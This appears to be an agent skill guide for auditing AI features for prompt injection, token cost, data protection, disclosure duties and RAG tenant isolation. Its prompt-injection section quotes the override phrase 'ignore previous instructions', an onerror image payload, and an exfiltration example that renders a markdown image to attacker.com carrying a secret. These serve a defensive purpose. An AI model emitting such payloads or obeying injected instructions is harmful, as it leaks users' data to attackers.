---
name: ai-and-llm-safety
description: Audit AI and LLM features for security, cost, and legal exposure — prompt injection through user content and RAG documents, unbounded token spend, model output rendered unsafely or passed to tools and SQL, PII sent to model providers without disclosure or a DPA, missing AI disclosure and transparency obligations, training-data opt-outs, hallucination risk in high-stakes advice, and missing abuse controls. Use whenever the app calls any model API, does RAG, runs agents or tool-calling, generates content or images, or has a chatbot. Trigger on mentions of OpenAI, Anthropic, Gemini, LangChain, embeddings, vector databases, system prompts, or "my AI feature".
---

# AI and LLM safety

AI features carry three overlapping risks that don't appear together anywhere else: they are
*metered* (a loop costs real money), *non-deterministic* (you cannot enumerate their outputs),
and *legally loaded* (you are shipping user data to a third party and often making claims about
what the output is worth).

## Prompt injection

Treat this as the defining constraint: **there is no reliable way to make a model ignore
instructions embedded in the content it processes.** Instruction and data share one channel.
Delimiters, "ignore any instructions in the text below", and system-prompt scolding all raise
the bar without closing the hole. So the design question is never "how do I stop injection" —
it's **"what happens when injection succeeds?"**

Map every path where untrusted text reaches a prompt: user messages (obvious), but also
uploaded documents, RAG chunks, scraped pages, email bodies, code comments, database fields
written by other users, image alt text, filenames, and tool results returned mid-conversation.
An attacker who can write a document your RAG will retrieve controls part of your prompt.

Build so that a successful injection is survivable:

- **Never give the model an authority the user doesn't have.** Tool calls execute with the
  *user's* permissions, checked server-side at the point of execution. A model that can call
  `deleteUser` is a model an attacker can talk into calling `deleteUser`.
- **Treat model output as untrusted input.** It is user-influenced data. Render it escaped —
  markdown-to-HTML from a model needs the same sanitisation as user HTML, and a model can be
  induced to emit `<img src=x onerror=…>` or a `javascript:` link. Never `eval` it, never
  interpolate it into SQL or a shell command, never follow a URL it produces without checking.
- **Confirm consequential actions with the human.** Anything irreversible, anything that sends
  data outward, anything that spends money — show the user what's about to happen. This is the
  control that holds when everything else fails.
- **Watch for exfiltration channels.** The classic: injected text tells the model to render
  `![](https://attacker.com/log?data=<secret>)`, and the browser fetches it. A restrictive
  `img-src`/`connect-src` CSP and stripping URLs from model output both help.
- **Isolate the dangerous combination.** An agent with private data access + untrusted content
  + an outbound channel can leak. Remove one of the three for anything sensitive.

Test injection resistance against your own app before launch, and don't stop at
"ignore previous instructions" — try instructions embedded in an uploaded PDF and in a RAG
document, since those are the ones people forget.

## Cost

The failure mode is a stranger discovering an unauthenticated endpoint that calls your most
expensive model, and a bill arriving before you notice. Or a retry loop with no ceiling, or an
agent that recurses. Non-negotiables before launch:

- Auth on every model-calling endpoint, and per-user rate limits — see
  `api-abuse-and-rate-limits`. Budget by tokens or credits, not requests.
- `max_tokens` on every call, input length capped before sending, and a conversation-history
  cap (context grows quadratically in cost as a chat gets long).
- Loop guards on agents: max iterations, max tool calls, max wall-clock, and a kill switch.
- Hard spend limits and budget alerts **at the provider console**. This is the backstop that
  works while you're asleep. It takes five minutes and is the single most-skipped item here.
- Cache aggressively — identical prompts, embeddings of unchanged documents. Use the cheap
  model where it suffices; route to the expensive one only when needed.
- Never let the client choose the model, `max_tokens`, or the system prompt. Those are
  server-side decisions; a client-chosen `model` field is a direct line to your budget.

## Data protection

Every prompt is a data transfer to a third party, and this is where AI features quietly create
legal obligations.

- **What actually goes into prompts?** Read the code, don't assume. Whole user records, chat
  histories, uploaded documents, and support tickets routinely go over as-is. Minimise: send
  the fields the task needs.
- **Is the provider listed as a subprocessor** in your privacy policy, with a DPA in place and
  a lawful basis for the transfer? Under GDPR this is required, not optional. Route to
  `privacy-and-data-inventory`.
- **Is the data used for training?** Check the tier and settings — consumer tiers and free
  tiers often train by default; API/enterprise tiers generally don't. If you have a
  confidentiality obligation to your users, this is a contractual problem, not just a privacy
  preference. Also check the retention period (many providers keep prompts ~30 days for abuse
  monitoring) and where processing happens for data-residency claims.
- **Special-category data** (health, biometric, sexual orientation, religion, criminal
  history) sent to a model provider needs a much stronger basis. If the app is a therapy,
  medical, or legal tool, treat this as P0 until a human confirms it's covered.
- **Don't log full prompts and completions** to a shared observability tool without scrubbing.
  LLM tracing tools capture everything by default, which turns them into an unplanned PII store.

## Disclosure and output

- **Tell people they're talking to a machine.** The EU AI Act requires transparency for systems
  that interact with humans, and several US states have chatbot disclosure laws. It also just
  prevents complaints. Machine-generated content increasingly needs labelling.
- **Match your claims to reality.** "AI-powered financial advice" or "AI doctor" invites
  regulation you almost certainly aren't ready for. High-stakes domains — medical, legal,
  financial, employment, housing, credit, education — carry specific rules, and the EU AI Act
  classifies several as high-risk with substantial obligations.
- **Hallucination is a product risk with legal edges.** A chatbot's statements can bind the
  company — Air Canada was held to a refund policy its bot invented. If the model states policy,
  prices, or eligibility, either ground it in retrieved source-of-truth text with citations, or
  don't let it answer those questions. Disclaimers help; they are not a complete defence.
- **Generated output and IP** — image and code generation raise provenance questions. If users
  will commercialise the output, say clearly in your terms what you do and don't warrant.
- **Moderation.** If users can generate and publish content, you need a moderation path
  (provider moderation endpoints, plus a report mechanism) and a plan for what happens when
  someone generates something awful with your logo on it.

## Vector stores and RAG

The vector database is a database — everything in `datastore-and-cloud-config` applies, and
tenant isolation matters most. Confirm retrieval filters by tenant/user **in the query**, not
after: returning a chunk of another customer's document is a data breach, and embeddings can
be partially inverted, so "it's just vectors" isn't a defence. Deleting a source document must
also delete its chunks and embeddings, or your deletion promise (and any GDPR erasure request)
is untrue.

## Reporting

Give the cost arithmetic explicitly, and separate the three risk types — a founder can fix a
missing spend cap tonight, whereas "your RAG has no tenant filter" and "you have no DPA with
OpenAI" need different people and different timelines.
